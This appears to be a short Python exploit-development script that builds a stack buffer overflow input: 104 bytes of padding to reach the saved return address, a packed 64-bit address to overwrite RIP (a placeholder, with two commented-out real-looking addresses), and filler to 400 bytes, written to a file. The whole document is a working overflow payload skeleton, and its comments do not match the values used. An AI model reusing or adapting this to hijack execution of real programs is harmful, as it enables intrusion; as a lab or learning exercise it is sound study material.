from struct import *

buf = ""
buf += "A"*104                      # offset to RIP
# buf += pack("<Q", 0x7fffffffeeac)   # overwrite RIP with 0x0000424242424242
# buf += pack("<Q", 0x7ffff7a5226a)   # overwrite RIP with 0x0000424242424242
buf += pack("<Q", 0xBBBBBB)   # overwrite RIP with 0x0000424242424242
buf += "C"*290                      # padding to keep payload length at 400 bytes

f = open("in.txt", "w")
f.write(buf)
